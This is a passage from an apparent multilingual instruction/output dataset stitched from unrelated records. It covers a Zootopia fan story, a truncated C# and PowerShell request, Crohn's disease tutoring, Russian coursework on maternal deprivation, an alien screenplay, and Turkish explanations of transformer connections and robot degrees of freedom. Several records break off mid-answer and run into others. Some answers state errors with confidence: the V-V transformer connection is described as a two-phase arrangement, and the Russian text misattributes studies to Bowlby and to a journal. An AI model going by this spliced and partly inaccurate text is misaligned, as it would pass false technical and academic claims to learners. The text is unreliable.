\\"Sorry, folks, but the only 'share' these two are getting are the inside of a jail cell,\\" Judy quipped. Tragically for Gideon and his ferret friend, they hadn't generated enough viral traction to evade the law. As Nick slapped on the cuffs, Gideon bemoaned, \\"But... but my influencer lifestyle! My subscribers!\\" Despite the commotion, the criminals were dispatched with usual ZPD efficiency. Eventually, the disturbance subsided, and Judy found her head easing back onto her pillow. Then, as the confusion of the night melted away, Officer Judy Hopps awakened with a start. The clock showed it was just past dawn, and she realized it was all a wild, cheesy dream. Her apartment was silent, the city was peaceful, and the only influencer she needed to worry about catching was the sandman for a few more hours of sleep. In the real Zootopia, Gideon was happily kneading dough at his bakery, crime was just a bit of dreamland nonsense, and Judy had a full day ahead of her – no livestreams required."},{"instruction":"c# dda powershell kullanarak sistemdeki provisionedappxpaketlerin paket adlarını alalım ve onsolde göstrelim","output":"C# içinden PowerShell kullanarak sistemde yüklü olan Provisioned AppX paketlerinin paket adlarını almak ve konsolda göstermek için aşağıdaki adımları takip edebilirsiniz.

Thickening and narrowing of the mucosa. Transmural inflammation.ulcers and fissure","output":"Your response to question 1 captures several key histopathological features of Crohn's disease, but let's elaborate on that: In Crohn's disease, the characteristic histopathological findings include: - **Transmural inflammation**: This is a hallmark of Crohn's disease, where inflammation can affect every layer of the bowel wall, not just the mucosa as in ulcerative colitis. This transmural involvement can lead to complications such as fistulas and strictures. - **Granulomas**: Non-caseating granulomas are present in up to 60% of cases but are not required for the diagnosis. Their presence, however, is a useful feature to differentiate Crohn's disease from other forms of inflammatory bowel disease (IBD), particularly ulcerative colitis. - **Fissuring ulcers**: Longitudinal and deep ulcers can develop, which sometimes lead to fistulae and sinus tracts. - **Cobblestone appearance**: This results from the submucosal edema and the presence of linear ulcers, leading to a characteristic 'cobblestone' appearance of the mucosal surface. - **Lymphoid aggregates and hyperplasia**: As part of the immune response within the bowel wall. - **Fibrosis**: Leading to bowel wall thickening and strictures as a chronic change. Remember that these are microscopic findings typically assessed by a pathologist on biopsies taken during endoscopy. Clinically, you might suspect Crohn's disease based on symptoms, imaging findings, and lab tests before these histopathological features confirm the diagnosis."},{"instruction":"3.abdominal pain in right iliac fossa mimic acute appendicitis but with no rebound tenderness. Watery diarrhea, weight loss and fatigue. Arthritis, uveitis, skin problems","output":"That's a good start. To elaborate further on question 3 regarding the presentation of Crohn's disease, patients can indeed present with a wide variety of gastrointestinal and systemic symptoms: - **Gastrointestinal Symptoms:** - Chronic or intermittent **diarrhea**: It can be watery or may contain blood if there is significant inflammation or ulceration. - **Abdominal pain**: The pain is often crampy and may localize to the right lower quadrant due to ileal involvement, which as you said, can sometimes mimic acute appendicitis. - **Bowel obstruction symptoms**: These may arise due to stricturing and include cramping, distension, nausea, and vomiting. - **Perianal disease**: This can include fissures, abscesses, and fistulae, which contribute to significant discomfort and morbidity. - **Constitutional Symptoms:** - **Weight loss**: Often due to reduced food intake because of pain or malabsorption. - **Fatigue**: Can be a consequence of chronic inflammation, anemia, or nutritional deficiencies. - **Extraintestinal Manifestations:** - **Musculoskeletal**: Arthralgia or arthritis, often affecting large joints in an asymmetric pattern. - **Ocular**: Uveitis or episcleritis. - **Dermatological**: Erythema nodosum, pyoderma gangrenosum, and other skin rashes or lesions. - **Hepatobiliary**: Primary sclerosing cholangitis, gallstones, autoimmune hepatitis. - **Renal**: Kidney stones which may occur due to increased oxalate absorption in patients with ileal disease or surgical resection. When suspecting Crohn's disease based on clinical presentation, further diagnostic workup is warranted, including lab tests, imaging, and endoscopic evaluation. It's also pertinent to note that due to the transmural nature of inflammation, abscesses and fistulas are more common in Crohn's disease than in other inflammatory bowel diseases."},{"instruction":"Привет.

Пишу курсовую. Тема: «Влияние материнской депривации на психическое развитие ребёнка». Нужно описать метод наблюдения в контексте материнской депривации. Полностью, научным языком и много. Что это, как проводится, преимущества, недостатки и т.д. Свяжи это с исследованиями Боулби и других. В общем всё описать, но структурировано","output":"Введение: Влияние материнской депривации на психическое развитие ребёнка является актуальной проблемой в современном обществе. Одним из способов изучения этого вопроса является использование метода наблюдения. В данной работе будет рассмотрен метод наблюдения в контексте материнской депривации, его особенности, преимущества и недостатки, а также связь с исследованиями Джона Боулби и других ученых. Определение метода наблюдения: Метод наблюдения представляет собой систематическое наблюдение и регистрацию психических и поведенческих проявлений объекта исследования. Этот метод позволяет установить причинно-следственные связи между различными факторами и их влиянием на психическое развитие ребёнка, а также выявить особенности и патологические проявления в случае материнской депривации. Особенности проведения метода наблюдения в контексте материнской депривации: Для проведения метода наблюдения в контексте материнской депривации необходимо создать специальные условия, которые могут моделировать отсутствие материнского влияния на ребёнка. Это может быть достигнуто путем рассмотрения группы детей, которые находятся под опекой и уходом разных факторов, включая матерей с разным уровнем вовлеченности в жизнь ребенка, а также случаи, когда дети воспитываются в детских домах. Преимущества метода наблюдения в исследовании материнской депривации: Первое преимущество метода наблюдения заключается в возможности получить первичные данные о поведении и психических процессах ребенка в ситуации отсутствия материнского влияния. Также этот метод позволяет ученым выявить долгосрочные последствия на психическое развитие ребенка, такие как психические расстройства, аномальное социальное поведение и эмоциональные проблемы. Недостатки метода наблюдения в исследовании материнской депривации: Одним из основных недостатков метода наблюдения является невозможность контроля над многими внешними факторами, которые могут влиять на психическое развитие ребенка. Также этот метод не позволяет установить точные причины, по которым материнская депривация может повлиять на психическое состояние ребенка. Связь с исследованиями Боулби и других ученых: Джон Боулби - известный психолог и психиатр, который внес значительный вклад в исследование материнской депривации и ее влияние на психическое развитие ребенка. Он разработал теорию привязанности, согласно которой дети, не получающие достаточного уровня заботы и внимания от матери, могут испытывать депривацию и иметь отклонения в психическом развитии. Метод наблюдения позволяет подтвердить или опровергнуть данную теорию путем изучения реальных случаев детей с материнской депривацией. Заключение: Метод наблюдения в контексте материнской депривации является эффективным инструментом для изучения влияния этого фактора на психическое развитие ребенка. Он позволяет получить первичные данные о поведении и психических процессах ребенка и выявить долгосрочные последствия материнской депривации. Однако этот метод имеет недостатки, такие как невозможность контроля над внешними факторами и неспособность установить точные причины влияния материнской депривации на психическое состояние ребенка. Связь с исследованиями Боулби и других ученых позволяет получить дополнительные научные подтверждения теорий о влиянии материнской депривации на психическое развитие ребенка."},{"instruction":"Надо в такой структуре: Метод беседы, или интервью, является одним из ключевых инструментов в исследованиях психологии, включая анализ влияния материнской депривации на психическое развитие ребёнка. Этот метод позволяет получить глубокое понимание индивидуального опыта, чувств, восприятия и мыслей субъекта исследования. # Применение метода беседы: Используя метод беседы, исследователи могут задавать открытые вопросы, что позволяет собеседникам детально описывать свои личные переживания и реакции на события. В контексте материнской депривации, этот метод часто используется для того, чтобы выявить внутренний мир ребенка, его чувства и мысли по поводу отсутствия или недостатка материнской заботы. Качественные интервью могут выявить субъективные аспекты переживаний депривации, которые не всегда доступны для наблюдения или количественного измерения. # Примеры исследований: Один из классических примеров использования метода беседы — это исследования Джона Боулби, который в середине 20-го века проводил интервью с детьми, оказавшимися за решеткой и испытывающими материнскую депривацию. Эти беседы помогли ему разработать теорию привязанности. Современные исследования также часто включают метод беседы. Примером может служить работа Developmental Psychology, которая провела серию интервью с детьми, пережившими семейную разлуку, чтобы определить, как долгосрочная разлука с родителями влияет на их поведение и социальное взаимодействие на различных жизненных этапах. # Возможности и ограничения метода: Метод беседы обладает рядом преимуществ, включая гибкость в извлечении детализированной информации и возможность установления доверительных отношений между исследователем и участником. Однако метод требует тщательной подготовки вопросов и стратегий для наилучшего сбора информации, а также качественного анализа полученных данных. Основным ограничением является субъективный характер данных, а также влияние предвзятости исследователя и частного восприятия информации респондентами. Тем не менее, метод беседы, используемый в комбинации с другими методами, такими как стандартизированные психологические тесты и наблюдения, способствует получению комплексного понимания эффектов материнской депривации на психическое развитие ребенка. Исследователи продолжают внедрять этот метод для изучения механизмов приспособления, компенсации и реабилитации детей, подвергшихся отсутствию материнской заботы, и для разработки эффективных стратегий воспитания и лечения.","output":"# Заключение: Метод беседы является важным инструментом в исследовании влияния материнской депривации на психическое развитие ребёнка.

He is given a nice suit by two alien soldiers. Her soldiers are bipedal creatures with four arms and a plate-like body covering resembling an insect exoskeleton. Most notably, they have a single large eye centered in their torso. While the commander is talking to their future boss, the two alien soldiers casually chat in their home language if they'll get new weapons. The two of them hold spears.","output":"[INT. ALIEN COMMAND TENT - DAY] A grand futuristic tent with alien symbols etched into its metallic facade sits in the middle of a bustling extraterrestrial mining camp. Inside, COMMANDER ZYTHARA, a statuesque alien in a starched white coat, complete with a shining belt, peaked cap, and pristine gloves, stands facing a slightly nervous yet composed young human, THOMAS. Two large, four-armed SOLDIERS, their exoskeletal armor clicking with each movement, stand on either side of Thomas, a blue suit in their multitude of hands. COMMANDER ZYTHARA: (in a thunderous voice, slightly echoing) Behold, Thomas! As you are among the elite of your species, I, Commander Zythara of the Glorznak fleet, hereby bestow upon you the administrator's mantle of the beautiful mining town of Earth Sector 7-B! Thomas nods, taking the moment seriously despite the absurdity. THOMAS: (quietly, with a posh accent) I am most honored, Commander. I assure you, my administrative skills shall not disappoint. Commander Zythara looms over him, her blue skin reflecting the high-tech lighting of the tent. She places a huge hand on his shoulder, almost dwarfing him. COMMANDER ZYTHARA: I have no doubt, tiny human. Your reputation for meticulous organization precedes you. (She grins, glancing down at her own attire) You’ll find the uniform suits one in a position of power. The soldiers, without ceremony, start fitting Thomas into the suit. They move with an awkward grace, their single eyes fixated intently on the task. SOLDIER 1: (to Soldier 2, in a chittering alien language subtitled) Do you think we will finally get those blasters instead of these outdated spears? SOLDIER 2: (carefully adjusting Thomas's tie, but responding to Soldier 1) If this human can improve efficiency, surely the Commander will reward us. Thomas, dressed sharply in his new suit, raises an eyebrow but chooses to ignore the soldiers’ chatter, assuming they are giving him fashion advice in a language he couldn’t comprehend. THOMAS: (forced confidence) With my oversight, the productivity of the mine will increase by at least 20%. The commander chuckles, the sound deep and resonant. COMMANDER ZYTHARA: (patronizingly) Adorable! (leans down, whispered aside) Just remember, administrator, productivity is not the only measure of success on this planet. Suddenly, her communicative device buzzes. Zythara reads the message and a twinkle of annoyance crosses her eyes. With a huff, she straightens up. COMMANDER ZYTHARA: (turning toward the entrance) It would seem my presence is required elsewhere. Oversee the humans, keep them from... what is it they do...? Ah, yes. Panicking. Carry on, Administrator Thomas! Thomas looks equal parts horrified and determined. As Zythara strides out, her coat flaring dramatically, Thomas tries to stand a bit taller, mimicking her air of authority. THOMAS: (to himself) Panicking, she says... right. How hard could it possibly be? The two soldiers exchange another glance, spears in hand. SOLDIER 1: (nudging Soldier 2) Odds on human panic by the end of the day? SOLDIER 2: (a motion that could be considered a shrug) Not taking that bet. Too predictable. The soldiers, chuckling in their alien tongue, exit the tent following their commander, leaving Thomas with a perplexed look as he surveys his new domain – a desk made of what appears to be extra-terrestrial mahogany, three glowing screens awaiting his commands, and far outside the tent, the sounds of the busy alien mining operation resonating under a strange sky.

Genellikle yerel dağıtım ve endüstriyel uygulamalarda, özellikle eski iki fazlı motorların çalıştırılması veya özel aydınlatma sistemlerinde ihtiyaç duyulur. Bu bağlantı Charles F. Scott'un adını taşır ve 1890'larda Westinghouse Electric Company için çalışırken geliştirilmiştir. Scott bağlantısında, iki adet tek fazlı transformatör kullanılır: Bir T-bobini (ana transformatör) ve bir teaser bobini (yardımcı transformatör). T-bobini ana hattın tam gerilimi altında çalışırken, teaser bobini ise %86,6 oranda (tam gerilimin √3/2'si kadar) ve 90 derece faz kaymış gerilim altında çalışır. Bu iki transformatör, üç fazlı bir kaynaktan elde edilen gerilimin iki eşit, 90 derece faz farklı iki fazlı gerilime dönüştürülmesi için özel bir şekilde bağlanır. Bu düzenleme, iki fazlı yükün doğru bir şekilde çalışmasını sağlamak için gerekli olan fazlar arası gerilim ve akım dengesini sağlar. Scott bağlantılı transformatörler, iki fazlı sistemlerde kullanılmaya devam etmesine rağmen, günümüzde daha az yaygındır çünkü elektrik sistemleri genellikle üç fazlı hale gelmiştir. Bu nedenle, Scott bağlantısı daha çok tarihi uygulamalar ve spesifik endüstriyel uygulamalarla sınırlıdır."},{"instruction":"transformatörlerde V-V bağlantısını bana paragraf şeklinde anlat","output":"V-V bağlantısı, transformatör endüstrisinde kullanılan bir bağlantı türüdür ve genellikle iki adet tek fazlı transformatörü kastederek bu terimi kullanırız. V-V bağlantısı adını, transformatörlerin giriş ve çıkış uçlarının elektrik sembollerinde V şeklini andırmasından alır. Bu bağlantının kullanım amacı, iki fazlı güç sistemlerinde kullanılmak üzere transformatörleri yapılandırmaktır. Bir V-V bağlantısında iki tek fazlı transformatör yan yana kullanılır ve her biri kendi fazında bağımsız olarak çalışır. Giriş tarafında her bir transformatörün birincil sargısı ayrı ayrı birer faz tarafından beslenir. Yük tarafında ise, her bir transformatörün ikincil sargısı ayrı bir yük fazını besler. Bu bağlantı türü, basitliği ve esnekliği nedeniyle özellikle iki fazlı sistemlerin gerektiği yerlerde tercih edilir. V-V bağlantısının önemli avantajlarından biri, tek fazlı transformatörlerin kullanımı ile sistemde modülerlik ve bakım kolaylığı sağlamasıdır. Herhangi bir transformatör arızalandığında, sistemin diğer kısmını etkilemeden söz konusu transformatör rahatlıkla değiştirilebilir veya bakımı yapılabilir. Ancak, V-V bağlantısının dezavantajı, dengesiz yük durumlarında transformatörler üzerinde faz dengesizliğine yol açabilmesidir, bu da sistem performansı üzerinde olumsuz etkilere neden olabilir. Bu nedenle, V-V bağlantılı sistemler genellikle dengeli yük profilleri ve iki fazlı uygulamalar için uygundur."},{"instruction":"robotlarda serbestlik derecesini bana paragraf şeklinde açıkla","output":"Robotlarda serbestlik derecesi (Degree of Freedom, kısaca DoF), bir robotun veya robot kolunun bağımsız olarak hareket edebileceği eksen veya düzlemlerinin sayısını ifade eder. Bir hareketin serbestliği, genellikle dönme (rotasyonel) veya kaydırma (lineer) hareketleri olarak tanımlanır. Örneğin, basit bir robot kolunda bilek, dirsek ve omuz gibi birden fazla eklem bulunabilir ve her eklem, kolun bir serbestlik derecesine sahip olmasını sağlar. Serbestlik derecesi, robotun yapabileceği işleri, erişebilirliğini ve manevra kabiliyetini doğrudan etkiler. İnsan kolunu benzetirsek, bir insan kolu yaklaşık yedi serbestlik derecesine sahiptir; omuz üç, dirsek bir ve bilek üç. Robotik sistemlerde ise, genellikle basit görevler için altı serbestlik derecesine sahip robot kollar kullanılır. Bu altı serbestlik derecesi, robot kolunun üç boyutlu uzayda herhangi bir konum ve yönelime erişmesini sağlar; üçü konumlandırma ve üçü yönlendirme için kullanılır. Ancak, belirli karmaşık görevler daha fazla serbestlik derecesi gerektirebilir. Örneğin, cerrahi robotlar veya uzay robotları gibi çok özel amaçlı robotlar, daha karmaşık hareketler yapabilmeleri için yedi ya da daha fazla serbestlik derecesine sahip olabilirler. Serbestlik derecesinin bir diğer önemli noktası, robotların dengesi ve kontrolüdür. Serbestlik derecesinin artması, robotun daha karmaşık hareketler yapabilmesine olanak tanırken, aynı zamanda robotun kontrolünü karmaşıklaştırabilir ve daha gelişmiş kontrol algoritmaları gerektirebilir. Genel olarak, robotun tasarımında belirli bir amaca yönelik olarak gereken serbestlik derecesinin belirlenmesi, robotu hem verimli hem de işlevsel kılan önemli bir tasarım kararıdır."},{"instruction":"robotlarda serbestlik derecesini bana faraklı bir bakış açısıyla paragraf şeklinde açıkla","output":"Serbestlik derecesi, robotikte bir robotun veya manipülatörün bağımsız kontrol edilebilen hareket eksenlerinin sayısı olarak tanımlanır ve bir robotun yeteneklerini ve karmaşıklığını anlamak için temel bir kavramdır. Bir robotun serbestlik derecesi, onun fiziksel çevreyle olan etkileşimini ve görevleri ne kadar duyarlık ve detayla gerçekleştirebileceğini belirler. Doğal dünyada bir örnek vermek gerekirse serbestlik derecesi, bir hayvanın vücudu tarafından gerçekleştirilebilen bağımsız hareket çeşitliliğine benzetilebilir; bir insan parmağı basit hareketlerden karmaşık el hareketlerine kadar çok çeşitli işlevler için farklı yönlere hareket edebilir, bu da birden fazla serbestlik derecesine sahip olduğunu gösterir. Robotlarda ise her serbestlik derecesi, robotun bir eklemini veya modülünü bağımsız olarak kontrol edebilmeyi ifade eder. Fiziksel olarak, bu eklemler motorlar, aktüatörler ve sensörlerle donatılmış olup, robotun belirli bir alanda etkili bir şekilde operasyon yapabilmesi için geometrik ve kinematik kısıtlamaları aşabilmesini sağlar. Örneğin, basit bir endüstriyel robot kolu, üretim bandında bir nesneyi alıp bırakmak için yalnızca üç serbestlik derecesine ihtiyaç duyabilirken; astronotlarla etkileşim kurabilen, daha karmaşık görevler icra eden bir uzay robotu, çok daha yüksek bir serbestlik derecesine sahip olmalıdır. Serbestlik derecesi sadece robotların fiziksel tasarımını değil, aynı zamanda yazılımsal yeteneklerini de etkiler. Yüksek serbestlik dereceleri, kontrol sistemleri için daha fazla zorluk yaratır ve hareket planlaması, engellerden kaçınma, ve hassasiyet gerektiren görevlerde daha kompleks algoritmaların kullanılmasını gerektirir.
